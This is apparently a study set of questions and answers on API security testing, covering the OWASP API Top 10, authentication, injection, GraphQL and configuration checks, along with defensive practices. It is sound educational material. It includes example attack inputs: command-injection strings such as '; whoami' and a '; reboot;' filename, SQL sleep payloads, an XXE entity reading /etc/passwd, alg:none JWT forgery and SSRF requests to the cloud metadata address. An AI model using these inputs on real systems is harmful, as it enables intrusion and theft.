Question: What is the difference between HTTP and HTTPS?
Answer: HTTP (Hypertext Transfer Protocol) is the protocol for transmitting web data. HTTPS (HTTP Secure) is the secure version of HTTP. It encrypts the communication between the client and the server using TLS/SSL, protecting the data from eavesdropping and man-in-the-middle attacks. All APIs should use HTTPS.

---

Question: What is an API key?
Answer: An API key is a simple token that is used to identify the calling application or user. It is typically passed in an HTTP header (e.g., `X-API-Key`) or a query parameter. It is a form of authentication but is generally considered less secure than protocols like OAuth.

---

Question: What is OAuth 2.0?
Answer: OAuth 2.0 is an authorization framework that enables applications to obtain limited access to user accounts on an HTTP service. It works by delegating user authentication to the service that hosts the user account, and authorizing third-party applications to access the user account.

---

Question: What does it mean for an API to be 'stateless'?
Answer: A stateless API is one where the server does not store any information about the client's session state between requests. Each request from a client to the server must contain all the information needed to understand and process the request, such as an authentication token.

---

Question: What is API versioning and why is it important?
Answer: API versioning is the practice of managing changes to an API. It is important because it allows developers to introduce new features or breaking changes without disrupting existing client applications. Common versioning strategies include URI path versioning (e.g., `/api/v2/users`) and header versioning.

---

### Category: OWASP API Security Top 10

Question: What is the OWASP API Security Top 10?
Answer: It is a standard awareness document that lists the ten most critical security risks for APIs. It provides a framework for developers and security professionals to secure their modern API architectures.

---

Question: What is API1:2023 - Broken Object Level Authorization (BOLA)?
Answer: BOLA, also known as IDOR, is the most common and severe API vulnerability. It occurs when an API endpoint allows an authenticated user to access or modify data objects for which they are not authorized, simply by changing the ID in the request (e.g., `/api/users/123` to `/api/users/456`).

---

Question: What is API2:2023 - Broken Authentication?
Answer: This category covers vulnerabilities in how an API authenticates users. It includes weak password policies, allowing credential stuffing or brute-force attacks, improper handling of JWTs (like not validating the signature), and insecure password recovery mechanisms.

---

Question: What is API3:2023 - Broken Object Property Level Authorization?
Answer: This is a more granular version of BOLA. It occurs when a user is authorized to access an object but can access or modify specific properties (fields) of that object that should be restricted. For example, a regular user being able to update the `isAdmin` property on their own user object. This is often exploited via Mass Assignment.

---

Question: What is API4:2023 - Unrestricted Resource Consumption?
Answer: This vulnerability occurs when an API does not properly restrict the size or number of resources that can be requested by a client. This can lead to Denial of Service (DoS) attacks, where an attacker overwhelms the server with requests for large files, complex GraphQL queries, or a high volume of API calls due to missing rate limiting.

---

Question: What is API5:2023 - Broken Function Level Authorization (BFLA)?
Answer: BFLA occurs when an API fails to check if a user has the necessary permissions to perform a specific action, especially administrative ones. For example, a regular user being able to successfully call an admin-only endpoint like `DELETE /api/admin/deleteUser`.

---

Question: What is API6:2023 - Unrestricted Access to Sensitive Business Flows?
Answer: This vulnerability is about attackers abusing legitimate business logic. For example, an e-commerce site might have a business flow for purchasing a product. An attacker could automate this flow to buy up all the stock of a limited-edition item before real users can, or abuse a "refer a friend" feature to create millions of fake accounts for a reward.

---

Question: What is API7:2023 - Server-Side Request Forgery (SSRF)?
Answer: SSRF occurs when an API endpoint allows an attacker to trick the server into making an HTTP request to an arbitrary domain. This can be used to scan the internal network, attack internal services, or query cloud provider metadata endpoints to steal credentials.

---

Question: What is API8:2023 - Security Misconfiguration?
Answer: This is a broad category that covers security flaws resulting from improper configuration. Examples include unnecessary HTTP methods being enabled on an endpoint, missing security headers (like HSTS), overly permissive CORS policies, and verbose error messages that leak sensitive information.

---

Question: What is API9:2023 - Improper Inventory Management?
Answer: This vulnerability is about the failure to properly manage the entire API landscape. It includes exposing old, unpatched API versions (e.g., `/api/v1`), development or staging endpoints being left open to the public, and not properly documenting or retiring old endpoints.

---

Question: What is API10:2023 - Unsafe Consumption of APIs?
Answer: This category is unique as it focuses on how an application *consumes* third-party APIs. It includes risks like not validating data received from an external API (which could lead to injection), trusting external APIs with sensitive data, and not handling redirects from them securely.

---

### Category: Authentication & Authorization Testing

Question: How do you test a JWT for signature validation?
Answer: You can test this by taking a valid JWT, decoding it, changing a value in the payload (e.g., change your username to "admin"), and then changing the algorithm in the header to "none". If you then re-encode the token and the server accepts it, it is critically vulnerable.

---

Question: How do you test for weak password policies on a registration endpoint?
Answer: Attempt to create new users with very weak passwords, such as "12345", "password", or a single character. If the API accepts these passwords, it has a weak password policy.

---

Question: What is a test for insecure direct password reset?
Answer: In a password reset flow, if the API endpoint includes something predictable like the user's ID or email in the reset link (e.g., `/reset?user_id=123`), an attacker can simply guess the ID of another user to take over their account. Reset tokens should be long and random.

---

Question: How can you test for missing rate limiting on a login endpoint?
Answer: Use a tool like Burp Intruder or a custom script to send hundreds or thousands of login attempts with different passwords to the login endpoint in a short period. If the API does not block or slow down your requests, it is missing rate limiting and is vulnerable to brute-force attacks.

---

Question: How do you test an API key for excessive permissions?
Answer: Once you have an API key, use it to try to access endpoints and perform actions that the user should not be authorized to do. For example, if it's a "read-only" key, try to make POST or DELETE requests.

---

Question: What is a "replay attack" against an API?
Answer: A replay attack is when an attacker intercepts a valid request (e.g., a request to transfer money) and then "replays" or resends that same request multiple times to repeat the action without proper authorization. APIs should have measures to prevent this, like using nonces.

---

Question: How do you test for session termination vulnerabilities?
Answer: After logging a user out of the application, capture the session token or JWT that was used. Then, try to use that same token to access a protected endpoint. If the request is successful, the session was not properly invalidated on the server side.

---

Question: How do you test an OAuth 2.0 implementation for the "Implicit Grant" flow vulnerability?
Answer: The Implicit Grant flow is now considered insecure because it returns the access token directly in the browser's URL fragment. If an application is using this, an attacker could potentially steal the token through a compromised browser extension or a referer header leak.

---

Question: How to test for Broken Object Level Authorization (BOLA/IDOR)?
Answer: You need two user accounts, User A and User B. Log in as User A and perform an action on one of your objects, like viewing an order (`GET /api/orders/101`). Capture this request. Now, log in as User B, and replay the request for User A's order. If you can see the data, the endpoint is vulnerable.

---

Question: How do you test for Broken Function Level Authorization (BFLA)?
Answer: First, map out the API as a regular user. Then, try to guess the URLs for administrative endpoints, such as `/api/admin/users`, `/api/v2/promoteUser`, or changing the HTTP method from GET to POST on an endpoint. If any of these requests succeed, a BFLA vulnerability exists.

---

### Category: Input & Data Validation Testing

Question: How do you test an API endpoint for command injection?
Answer: Find an endpoint that takes input which might be passed to a system command (e.g., a filename for processing). Inject command separators like `;`, `|`, or `&&` followed by an OS command (e.g., `filename.txt; whoami`). If the command executes, it is vulnerable.

---

Question: How do you test an API for SQL injection?
Answer: Find endpoints that take an ID or other parameter that is likely used in a database query (e.g., `/api/products/123`). Inject SQL syntax like a single quote (`'`) to see if it causes an error, or a time-based payload (`123' AND SLEEP(5)--`) to see if the response is delayed.

---

Question: How can you test a GraphQL endpoint for batching attacks?
Answer: GraphQL allows you to "batch" multiple queries into a single HTTP request. An attacker can abuse this by sending a request containing hundreds or thousands of queries, potentially overwhelming the server. Test by sending a large array of queries in a single POST request.

---

Question: How do you test for Mass Assignment?
Answer: First, observe a normal request, like a user profile update (`{"name": "test"}`). Then, try to guess and add other properties to the JSON body that might exist on the backend object, such as `{"name": "test", "isAdmin": true, "credits": 99999}`. If the response shows these properties were updated, it is vulnerable.

---

Question: How can you test for Verbose Error Messages?
Answer: Send malformed requests to various endpoints: incorrect data types, missing parameters, invalid JSON, etc. Examine the error responses. If they contain stack traces, internal function names, database query snippets, or other internal information, this is a security misconfiguration.

---

Question: How do you test for XXE injection in an API that accepts XML?
Answer: If an endpoint accepts XML data (`Content-Type: application/xml`), modify the request to include a malicious DTD that defines an external entity pointing to a local file, like `<!ENTITY xxe SYSTEM "file:///etc/passwd">`. Then, reference that entity in the XML body (`&xxe;`).

---

Question: How do you test for Insecure Deserialization?
Answer: This is an advanced attack. If you know the language and framework the API is built on, you can craft a serialized object in that language containing a malicious payload. When the API deserializes this object, the payload executes. This often involves using tools like `ysoserial`.

---

Question: How do you test an API that accepts file uploads for vulnerabilities?
Answer: Test by uploading files with different extensions (e.g., `.php`, `.jsp`, `.exe`), files that are very large (to test for resource consumption), files with malicious content (like a web shell), and files with path traversal sequences in the filename (`../../shell.php`).

---

Question: What is parameter pollution and how do you test for it?
Answer: HTTP Parameter Pollution (HPP) is when you send multiple parameters with the same name. For example, `/api/search?user_id=123&user_id=456`. Some backends will only process the first, some the last, and some both. This can be used to bypass WAFs or override application logic. Test by duplicating parameters in your requests.

---

Question: How do you test a GraphQL endpoint for excessive errors?
Answer: Send a GraphQL query that intentionally asks for a non-existent field. If the error response reveals a lot of information about the schema, this can be a form of information leakage.

---

### Category: Logic & Process Testing

Question: How do you test for race conditions in an API?
Answer: Find an endpoint that performs a multi-step operation, like "check balance, then withdraw". Use a tool like Burp Turbo Intruder to send two withdrawal requests at almost exactly the same time. If both requests succeed even if there were only funds for one, a race condition exists.

---

Question: How would you test a "refer a friend" feature for abuse?
Answer: Attempt to automate the process of creating new accounts using your referral code. If there is no rate limiting, no CAPTCHA, and no validation on the new accounts, you can likely abuse the feature to gain a large number of referral bonuses.

---

Question: How do you test a coupon code feature for flaws?
Answer: Try to reuse the same coupon code multiple times. Try to apply a discount coupon to an item that is already on sale. Try to guess the format of coupon codes to find new ones. Try to apply a very large negative-value coupon.

---

Question: What is a test for API response manipulation?
Answer: In some cases, the client-side application might make security decisions based on the API's response. For example, if the API returns `{"isAdmin": false}`, the UI hides the admin button. Use a proxy like Burp Suite to intercept the response and change it to `{"isAdmin": true}` to see if you can unlock features on the client side.

---

Question: How do you test for an insecure API redirect?
Answer: If an API uses redirects (e.g., for authentication), check if the redirect URL can be controlled by a parameter. If so, try to redirect users to a malicious website. This is an "Open Redirect" vulnerability.

---

Question: How do you test for business logic flaws in a checkout process?
Answer: Manipulate the process in unexpected ways. For example, add a very expensive item to your cart, then apply a coupon, then change the quantity of the expensive item to zero. See if the coupon discount still applies to the remaining cheap items.

---

Question: How to test for API key leakage?
Answer: API keys are sometimes leaked in the client-side JavaScript code of a web application, in mobile app binaries, or in public GitHub repositories. Use tools to decompile mobile apps and search GitHub for the company's name or URL along with the term "API key".

---

Question: How do you test for denial of service through regex?
Answer: If an API uses a regular expression to validate input, it might be vulnerable to ReDoS (Regular Expression Denial of Service). This occurs when the regex is poorly written, and a specially crafted input string can cause it to take an extremely long time to evaluate.

---

Question: How do you find undocumented API endpoints?
Answer: Use directory bruteforcing tools (like dirsearch or ffuf) against the API domain. Look through the JavaScript files of the web application for hidden API calls. Monitor the network traffic of the mobile app.

---

Question: How do you test for information leakage in API responses?
Answer: Examine every API response carefully. Look for sensitive information that should not be there, such as internal IP addresses, user emails or PII, configuration details, or other users' data.

---

### Category: Configuration & Infrastructure Testing

Question: What security headers are important to check for in API responses?
Answer: Key headers include `Strict-Transport-Security` (HSTS) to enforce HTTPS, `Content-Security-Policy` (CSP) to prevent XSS, `X-Content-Type-Options: nosniff` to prevent MIME-sniffing, and `X-Frame-Options` to prevent clickjacking.

---

Question: How do you test an API for old, unpatched versions?
Answer: If the current API is `/api/v3/users`, always test for the existence of `/api/v2/users` and `/api/v1/users`. These older versions are often forgotten and may contain known vulnerabilities that have been fixed in the latest version.

---

Question: How do you test for a CORS misconfiguration?
Answer: Make a request to the API from a different origin (e.g., using a tool or a custom HTML file). Check the `Access-Control-Allow-Origin` header in the response. If it reflects your arbitrary origin, or if it is a wildcard (`*`) on an authenticated endpoint, it is misconfigured.

---

Question: How do you check if an API is exposing unnecessary HTTP methods?
Answer: For a given endpoint (e.g., `/api/users/123`), send a request with the `OPTIONS` HTTP method. The `Allow` header in the response will list all the enabled methods. If you see methods like `DELETE` or `PUT` on an endpoint that should be read-only, this is a misconfiguration.

---

Question: How do you test if an API is vulnerable to Host Header Injection?
Answer: Send a request to the API, but modify the `Host` header to point to an attacker-controlled domain. If the application uses this header to generate links (e.g., in a password reset email), an attacker can poison those links.

---

Question: What is the risk of an API not having a `Cache-Control` header?
Answer: If an API response containing sensitive data is missing a header like `Cache-Control: no-store`, it might be cached by the browser or an intermediary proxy. This could lead to that sensitive data being leaked to another user.

---

Question: How do you test for default credentials on an API's infrastructure?
Answer: An API is often supported by other services, like a database, a message queue, or a monitoring dashboard. It is important to check if these related services are exposed and if they are using default credentials (e.g., "admin":"admin").

---

Question: How can you find sensitive data in public documentation?
Answer: If the API has public documentation (e.g., a Swagger or OpenAPI file), examine it carefully. Sometimes developers accidentally leave internal API endpoints, sample API keys, or other sensitive information in the documentation.

---

Question: What is a test for stack trace exposure?
Answer: Send a deliberately malformed request that is likely to cause an unhandled exception in the application. For example, if an ID is an integer, send a very large number that will cause an overflow. If the API returns a full stack trace, it's a vulnerability.

---

Question: How to test an API for unprotected metadata endpoints?
Answer: If the API is hosted on a cloud provider (AWS, GCP, Azure), you can test for SSRF by trying to make the API request the cloud metadata service URL (e.g., `http://169.254.169.254`). If successful, this can expose cloud credentials.

---

### Category: GraphQL Specific Testing

Question: How do you perform introspection on a GraphQL API?
Answer: GraphQL has a built-in feature called introspection, which allows you to query the API for its own schema. If this is enabled in production, an attacker can send an introspection query to get a complete map of all available types, queries, and mutations, making it much easier to find vulnerabilities.

---

Question: How do you test for deep recursion in a GraphQL query?
Answer: If the GraphQL schema allows for nested relationships (e.g., a user has friends, who also have friends), an attacker can craft a deeply nested query. Send a query that is nested 10-20 levels deep to see if it causes a Denial of Service.

---

Question: What is a test for GraphQL query cost analysis?
Answer: A secure GraphQL API should have query cost analysis to prevent expensive queries. Test this by sending a query that asks for a very large number of items on a list, for example `users(first: 10000) { id name }`. If the API tries to fulfill this, it is likely vulnerable.

---

Question: How do you test for batching attacks in GraphQL?
Answer: GraphQL allows for multiple queries to be sent in a single HTTP request. Send a request containing an array of hundreds of queries to see if the server has a limit on how many it will process at once.

---

Question: How are authorization and authentication different in GraphQL?
Answer: Authentication is the same: the user must present a token to prove their identity. Authorization is more complex. Because a single query can access multiple different types of data, authorization checks need to be performed at the resolver level for each field, not just at the main endpoint.

---

Question: What is a GraphQL alias abuse attack?
Answer: GraphQL allows you to use aliases to request the same field multiple times in a single query. An attacker can abuse this by sending a query that requests the same resource hundreds of times using different aliases, potentially causing a DoS. Example: `{ user1: user(id:1){id}, user2: user(id:1){id}, ... }`.

---

Question: How can you test for information leakage in GraphQL error messages?
Answer: Send a syntactically correct but semantically incorrect query (e.g., ask for a field that doesn't exist). Examine the error message. If it provides detailed suggestions, stack traces, or internal server information, this is a vulnerability.

---

Question: How do you test for mutations that lack proper authorization?
Answer: Once authenticated as a regular user, use an introspection query (if available) to find the names of all available mutations. Then, attempt to execute every single mutation, especially ones that sound administrative like `createUser`, `deleteProduct`, or `changePermissions`.

---

Question: What is the difference between a Query, a Mutation, and a Subscription in GraphQL?
Answer: A Query is used for reading data (like a GET request). A Mutation is used for writing data (like a POST or PUT request). A Subscription is a long-lived connection used for receiving real-time data from the server.

---

Question: How do you test a GraphQL API for CSRF vulnerabilities?
Answer: Unlike REST, GraphQL APIs that only accept `Content-Type: application/json` are generally not vulnerable to traditional CSRF attacks from a web browser. However, it is still important to check if the server allows other content types.

---

### Category: Tooling & Methodology

Question: What is the first step in testing an API?
Answer: The first step is always mapping and exploration. You need to understand how the API works. Use the application as a normal user with a proxy like Burp Suite running to capture all the API requests and build a map of the endpoints, parameters, and authentication mechanisms.

---

Question: What is the role of Postman in API testing?
Answer: Postman is an API client that is excellent for exploring and interacting with an API in a controlled way. It's used to craft and send legitimate requests, organize them into collections, and understand the expected functionality before you start security testing.

---

Question: What is the role of Burp Suite in API testing?
Answer: Burp Suite is a security testing tool. It acts as an intercepting proxy, allowing you to capture requests made by the application or Postman and then modify (tamper with) them to test for vulnerabilities like IDOR, injection, and authorization flaws.

---

Question: What is Kiterunner?
Answer: Kiterunner is a powerful tool specifically designed for API security testing. It can take a large wordlist of potential endpoint paths and perform a content-aware bruteforce to discover hidden or unlinked API endpoints.

---

Question: What is a Swagger or OpenAPI file?
Answer: A Swagger or OpenAPI file is a specification document that describes a REST API. It defines all the available endpoints, parameters, expected responses, and authentication methods. It is an invaluable resource for both developers and security testers.

---

Question: What is "shifting left" in API security?
Answer: "Shifting left" refers to the practice of integrating security testing into the earliest stages of the software development lifecycle (SDLC). For APIs, this means performing security design reviews, using static analysis tools, and automating security tests in the CI/CD pipeline, rather than waiting until the end.

---

Question: What is the difference between DAST and SAST for API testing?
Answer: DAST (Dynamic Application Security Testing) tools, like Burp Scanner, test the running API from the outside in, sending malicious requests to find vulnerabilities. SAST (Static Application Security Testing) tools analyze the API's source code from the inside out to find potential security flaws before the code is even compiled.

---

Question: Why is it important to test both authenticated and unauthenticated endpoints?
Answer: You must test both. Unauthenticated endpoints should be tested for information leakage and to ensure they do not grant any unauthorized access. Authenticated endpoints must be tested for all authorization flaws, like BOLA and BFLA, to ensure one user cannot access another user's data.

---

Question: What is the value of creating a testing methodology or checklist?
Answer: A structured methodology or checklist ensures that your testing is consistent, repeatable, and comprehensive. It helps you remember to test for all the common vulnerability types on every endpoint and reduces the chance of missing a critical flaw.

---

Question: What is the most important skill for an API security tester?
Answer: Beyond technical knowledge, the most important skill is a curious and methodical mindset. A good tester must be able to understand the business logic of the API, think like an attacker, and creatively explore how the application can be abused in ways the developers never intended.

---

Question: What is Cross-Site Request Forgery (CSRF)?
Answer: Cross-Site Request Forgery (CSRF) is an attack that tricks an authenticated user into submitting a malicious request to a web application they are currently logged into. For example, an attacker could embed an image tag on a forum they control: `<img src="http://your-bank.com/transfer?to=attacker&amount=1000">`. If a logged-in user of the bank visits the forum, their browser will automatically make that request with their session cookies, transferring the money without their knowledge. Modern web frameworks often have built-in CSRF token protection to prevent this.

---

Question: What are the main risks of a file upload feature?
Answer: Unrestricted file uploads are a critical vulnerability. The primary risk is an attacker uploading a web shell (e.g., a `.php`, `.jsp`, or `.aspx` file) disguised as an image or document. If the attacker can then execute this file on the server, they gain Remote Code Execution (RCE) and can take full control of the web server. Other risks include path traversal in the filename to overwrite critical system files, and uploading files that can cause a Denial of Service (e.g., a "zip bomb").

---

Question: What is Cross-Site Request Forgery (CSRF)?
Answer: Cross-Site Request Forgery (CSRF) is an attack that tricks an authenticated user into submitting a malicious request to a web application they are currently logged into. For example, an attacker could embed a request in a malicious site that targets another site the user is logged into. If the victim visits the malicious site, their browser will automatically include their session cookies with the request, performing an action like changing their email or transferring funds without their knowledge. Modern web frameworks have built-in CSRF token protection to prevent this.

Question: What are the main risks of a file upload feature?
Answer: Unrestricted file uploads are a critical vulnerability. The primary risk is an attacker uploading a web shell (e.g., a `.php`, `.jsp`, or `.aspx` file) disguised as an image or document. If the attacker can then execute this file on the server, they gain Remote Code Execution (RCE) and can take full control of the web server. Other risks include path traversal in the filename to overwrite critical system files, and uploading files that can cause a Denial of Service (e.g., a "zip bomb").

Question: What is Cyber Security?
Answer: Cyber Security, also known as information security, is the practice of protecting computer systems, networks, devices, and data from malicious attacks, damage, or unauthorized access. Its goal is to maintain the confidentiality, integrity, and availability (known as the CIA triad) of digital information. It is a broad field that includes application security (like preventing SQLi), network security, cloud security, and operational security.

---

Question: What is the difference between parameterized queries and prepared statements?
Answer: Parameterized queries and prepared statements are often used interchangeably, as they achieve the same security goal. The subtle difference is in the implementation. A prepared statement is a pre-compiled SQL template that is sent to the database server first. Later, the application sends the user's data (the parameters) to "fill in the blanks." A parameterized query is a more general term where the query and the parameters are sent together, but the database driver ensures they are handled separately, preventing the data from being interpreted as code. In both cases, the result is the same: a complete separation of code and data, which is the most effective defense against SQL injection.

---

Question: How can second-order SQL injection be detected during code review?
Answer: Detecting second-order SQLi during a code review is difficult and requires a "taint analysis" mindset. The reviewer must:
1. Identify all points where user input is saved to a persistent store (database, file, etc.). This input should be considered "tainted."
2. Trace where that tainted data is later retrieved and used in the application.
3. Critically examine any database query that uses this retrieved, tainted data. If the data is used in a raw, concatenated query without being treated as a parameter, a second-order vulnerability likely exists. The key is to look for the "retrieve and execute" pattern.

---

Question: What are the typical places to look for injection bugs in an API?
Answer: An API tester must treat every piece of user-controllable data as a potential attack vector. The typical places to look for injection bugs are:
1. URL Query Parameters: e.g., `/api/items?id=INJECTION_HERE`
2. URL Path: e.g., `/api/items/INJECTION_HERE/details`
3. JSON Body: Every key-value pair in a POST or PUT request body.
4. HTTP Headers: Especially non-standard headers like `X-Forwarded-For` or custom headers, but also common ones like `User-Agent` and `Referer` if they are logged.
5. Cookies: Any value within a cookie that is processed by the server.

---

Question: How can you safely validate and sanitize JSON input on the server side?
Answer: Safely handling JSON input involves a multi-layered approach:
1. Schema Validation: Use a formal schema definition library (like JSON Schema or Pydantic for Python) to validate the incoming JSON structure, data types (string, number, boolean), and required fields. Reject any request that does not match the schema.
2. Content Validation: For string fields, apply strict allow-listing rules. For example, a username field should only allow alphanumeric characters. Reject any input that contains unexpected characters.
3. Output Encoding: Even after validation, always apply context-aware output encoding before displaying the data to prevent stored XSS.

---

Question: What is the most effective way to test JWT signature validation?
Answer: The most effective test is the "alg:none" attack.
1. Take a valid JWT issued by the application.
2. Decode the header and payload (they are just Base64 encoded).
3. Modify a claim in the payload, for example, change `"user": "test"` to `"user": "admin"`.
4. Modify the algorithm in the header from `"alg": "HS256"` to `"alg": "none"`.
5. Re-encode the header and payload.
6. Submit the token to a protected endpoint in the format `[encoded_header].[encoded_payload].` (with a trailing dot and no signature).
If the server grants access, the signature validation is critically broken.

---

Question: How should refresh tokens be implemented to minimize risk?
Answer: Secure refresh token implementation includes:
1. Refresh Token Rotation: When a refresh token is used to get a new access token, the server should invalidate the old refresh token and issue a new one. This prevents a stolen refresh token from being used indefinitely.
2. Short Expiration: Refresh tokens should have a reasonable expiration date (e.g., 7-30 days) and not be valid forever.
3. Secure Storage: They must be stored securely on the client, typically in an HttpOnly cookie, to protect them from XSS attacks.
4. Revocation: There must be a server-side mechanism to revoke a specific refresh token if a user's device is lost or their account is compromised.

---

Question: What are the security implications of long-lived vs short-lived access tokens?
Answer:
- Short-Lived Access Tokens (e.g., 5-15 minutes): This is the recommended practice. The major security benefit is that if an access token is stolen, its window of usability for an attacker is very small. The downside is slightly more complex client-side logic to handle token refreshing.
- Long-Lived Access Tokens (e.g., hours or days): These are less secure. A stolen token provides a large window for an attacker to access protected resources. They are simpler to manage but significantly increase the risk profile of the application.

---

Question: How can you mitigate credential stuffing attacks against an API?
Answer: Credential stuffing is an automated attack using breached credentials. Mitigation requires multiple layers:
1. Strict Rate Limiting: Limit the number of login attempts per IP address and per user account.
2. CAPTCHA: Implement a user-friendly CAPTCHA (like reCAPTCHA v3) after a small number of failed login attempts from a single IP.
3. Have I Been Pwned Integration: Check user passwords against a list of known breached passwords during registration and force the user to choose a unique one.
4. Multi-Factor Authentication (MFA): This is the most effective defense, as it requires a second factor that the attacker does not have.

---

Question: What telemetry would indicate a brute-force attack is in progress?
Answer: Key telemetry and alert triggers include:
1. A high rate of failed login attempts from a single IP address.
2. A high rate of failed login attempts against a single user account from multiple IPs.
3. A spike in the overall API 401 (Unauthorized) or 403 (Forbidden) error rate.
4. Login attempts using usernames that are sequential or follow a common pattern.
5. An unusual geographic distribution of login attempts.

---

Question: How do you detect blind SQLi when the application returns no error messages?
Answer: Detection relies on inferring information by forcing the database to perform an observable action. The two main techniques are:
1. Time-Based Detection: Inject a conditional command that causes a time delay (e.g., `IF(1=1, SLEEP(5), 0)`). If the application's response is delayed by 5 seconds, the injection was successful.
2. Content-Based Detection: Inject a boolean condition and observe subtle changes in the page content. For example, `' AND 1=1 --` might return a "Welcome back!" message, while `' AND 1=2 --` returns a "Login failed" message.

---

Question: What are safe patterns for logging user input without causing log injection or leakage?
Answer:
1. Never Log Raw Secrets: Never log sensitive data like passwords, API keys, or session tokens.
2. Sanitize and Encode: Before logging any user-controlled string, sanitize it by stripping out newline characters (`\n`, `\r`) to prevent log injection where an attacker fakes log entries.
3. Structured Logging: Use a structured logging format like JSON. Instead of concatenating strings, create a log object: `log.info({"event": "login_attempt", "username": user_input})`. This ensures data is treated as data, not as part of the log message format.
4. Redact PII: For compliance and privacy, automatically redact or mask Personally Identifiable Information (PII) like names, emails, and addresses before they are written to logs.

---

Question: How do you design an allow-list for dynamic table or column names?
Answer: Since parameterized queries cannot be used for identifiers like table or column names, an allow-list is the only safe approach. The implementation should be:
1. Create a hardcoded list or configuration of all valid and expected table/column names in the application code.
2. When the application receives user input that specifies a table or column, it MUST be checked against this hardcoded list.
3. If the input exactly matches an item in the allow-list, it can be safely used in the query.
4. If the input does not match any item in the allow-list, the request must be rejected.

---

Question: What are best practices for handling file uploads to avoid RCE or path traversal?
Answer:
1. Validate File Type on an Allow-List: Check the file extension against a strict allow-list of safe extensions (e.g., `.jpg`, `.png`, `.pdf`). Do not rely on the `Content-Type` header, as it is user-controlled.
2. Rename Uploaded Files: Generate a new, random filename for the uploaded file. Do not use the user-provided filename, as it could contain path traversal sequences (`../../`).
3. Store Files Outside the Web Root: Store uploaded files in a directory that is not directly accessible via a URL. Use a script to serve the files to users after an authorization check.
4. Scan for Malware: Use an antivirus or malware scanner on the uploaded files before making them available.

---

Question: How can you test for command injection in backend processing pipelines?
Answer: This requires understanding the application's flow. If you know an uploaded file is processed by a command-line tool (like ImageMagick for images), you can test for command injection by crafting a malicious filename. For example, a filename like `"; reboot; .jpg"` could be used. When the backend process runs `convert "; reboot; .jpg" output.jpg`, it might execute the reboot command.

---

Question: What are effective rate-limiting strategies for APIs (and their tradeoffs)?
Answer:
- Per-IP Rate Limiting: Easy to implement, but can unfairly block users behind a corporate NAT. It is also easy for attackers to bypass using botnets or proxy services.
- Per-API-Key or Per-User Rate Limiting: More effective and fair. It accurately limits the specific authenticated user. The tradeoff is that it requires more state to be tracked on the server.
- Tiered Limiting: The best approach. For example, have a general IP limit, a more generous limit for authenticated users, and even higher limits for premium, paying users.

---

Question: How do you design API pagination to avoid leaking data between users?
Answer: Pagination itself doesn't typically leak data, but the underlying query does. The critical control is to ensure that the database query for every page of results includes a `WHERE` clause that restricts the data to the currently authenticated user. For example: `SELECT * FROM orders WHERE user_id = ? LIMIT ? OFFSET ?`. Without the `user_id` check, an attacker could simply iterate through the pages and see all users' orders.

---

Question: What are the signs of an SSRF vulnerability when no external callbacks are allowed?
Answer: When you cannot get a direct DNS or HTTP callback, you must look for indirect signs:
1. Error Message Differences: A request to `http://localhost:22` (SSH) might return a different, more verbose error message than a request to `http://localhost:12345` (a closed port).
2. Response Time Differences: A request to a closed port will time out or fail instantly. A request to an open but non-HTTP port might take longer before timing out. These timing differences can be used to map the internal network.

---

Question: How can you protect cloud metadata endpoints from server-side access?
Answer:
1. WAF Rules: A Web Application Firewall can be configured to block any outgoing requests that contain the metadata service IP address (`169.254.169.254`).
2. Container Configuration: In modern containerized environments (like Kubernetes), it's possible to configure network policies that prevent pods from accessing the metadata service.
3. IMDSv2: Cloud providers like AWS have introduced IMDSv2 (Instance Metadata Service Version 2), which requires a session token. This makes it much harder for a simple SSRF vulnerability to be used to steal credentials.

---

Question: What is the danger of reflecting the Origin header in CORS responses?
Answer: Dynamically reflecting the `Origin` header in the `Access-Control-Allow-Origin` response header is a critical misconfiguration. It completely defeats the purpose of CORS. An attacker can host a malicious script on any website. When a victim visits that site, the script can make a request to the vulnerable API. The API will see the attacker's domain in the `Origin` header and reflect it back, allowing the malicious script to read the user's private data.

---

Question: How can you detect mass-assignment vulnerabilities in an API quickly?
Answer:
1. Add a non-existent parameter to a valid JSON request, like `"some_random_parameter": "test"`. If this parameter is reflected back in the response, it's a sign the API is using a flexible data binding model.
2. Use a tool like Burp Suite's "Param Miner" extension to automatically guess common hidden parameters (like `isAdmin`, `role`, `id`) and add them to requests to see if they have an effect.

---

Question: What are secure defaults for CORS configuration on public APIs?
Answer:
- For public, unauthenticated GET requests, it is generally safe to set `Access-Control-Allow-Origin: *`.
- For any endpoint that requires authentication or handles sensitive data (POST, PUT, DELETE), you should use a strict allow-list of trusted origins. Never use a wildcard (`*`) or reflect the Origin header for these endpoints.
- Set `Access-Control-Allow-Credentials: true` only when absolutely necessary and only with a specific origin, not a wildcard.

---

Question: How does content-security-policy (CSP) mitigate XSS in single-page apps?
Answer: CSP is a powerful defense-in-depth measure. For SPAs, a strict CSP can:
1. Prevent Inline Scripts: By disallowing `unsafe-inline`, it stops injected `<script>` tags from executing.
2. Restrict Script Sources: The `script-src` directive can be used to create an allow-list of trusted domains from which scripts can be loaded. This prevents an attacker from loading their malicious script from an external server.
3. Mitigate Data Exfiltration: The `connect-src` directive can restrict where the application is allowed to send data (e.g., via Fetch or XHR), making it harder for an attacker to steal cookies or other data.

---

Question: What are the risks of storing secrets in environment variables in containers?
Answer: While common, it has risks. Any process running in the container (including a compromised one) can often read its own environment variables. Additionally, environment variables can be accidentally logged or exposed through debugging endpoints. A more secure pattern is to use a dedicated secrets management tool (like HashiCorp Vault, AWS Secrets Manager, or Kubernetes Secrets) that injects secrets into the application at runtime.

---

Question: How can supply-chain vulnerabilities be introduced via CI/CD pipelines?
Answer:
1. Compromised Dependencies: The pipeline pulls in a malicious or vulnerable version of a third-party library from a public repository (e.g., npm, PyPI).
2. Pipeline Poisoning: An attacker gains control of the CI/CD system itself and injects malicious code into the build or deployment scripts.
3. Dependency Confusion: An attacker uploads a malicious package to a public repository with the same name as an internal private package. If the build system is not configured correctly, it might pull the malicious public version instead.

---

Question: What is the difference between DAST and SAST and when to use each?
Answer:
- SAST (Static Application Security Testing) analyzes the application's source code from the "inside-out" without running it. It's good at finding certain types of bugs (like SQLi) early in the development cycle ("shifting left").
- DAST (Dynamic Application Security Testing) tests the running application from the "outside-in" by sending malicious requests, like a real attacker. It's good at finding runtime and configuration issues.
They are complementary: use SAST during development and DAST during testing and in production.

---

Question: How would you test an API gateway for authorization bypasses?
Answer: An API gateway often handles authentication, but the final authorization logic may be in the backend microservice. Test for bypasses by:
1. Trying to access backend services directly, bypassing the gateway.
2. Checking for inconsistent authorization between the gateway and the backend. For example, the gateway might block a `DELETE` request, but if you send a request with a different verb like `POST` and use a header like `X-HTTP-Method-Override: DELETE`, the backend might process it.

---

